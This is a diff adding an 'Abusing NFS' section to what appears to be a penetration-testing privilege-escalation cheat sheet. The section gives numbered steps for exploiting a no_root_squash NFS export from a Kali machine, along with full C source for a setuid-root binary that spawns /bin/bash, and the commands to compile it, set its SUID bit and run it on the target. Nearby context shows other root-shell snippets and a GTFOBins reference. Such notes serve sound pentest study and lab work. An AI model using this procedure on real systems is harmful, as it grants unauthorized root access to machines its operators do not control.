@@ -653,6 +653,27 @@ cd /home/raj/script
 ./shell2
 whoami
 ```
+### Abusing NFS
+```
+1. Find no_root_sqush in /etc/exports
+2. Check if there is writable share in /etc/exports
+3. check mountable share with "showmount -e ip"
+4. kali: mkdir /tmp/nfs
+5. kali: mount -o rw ip:/tmp /tmp/nfs
+6. compile nfs.c with "gcc -static nfs.c -o nfs"
+nfs.c:
+#include <unistd.h>
+#include <stdlib.h>
+int main() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+7. put nfs in kali's /tmp/nfs
+8. kali: chmod +sx nfs
+9. execute nfs in target machine
+```
 ### GTFOBins
 ```
 GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
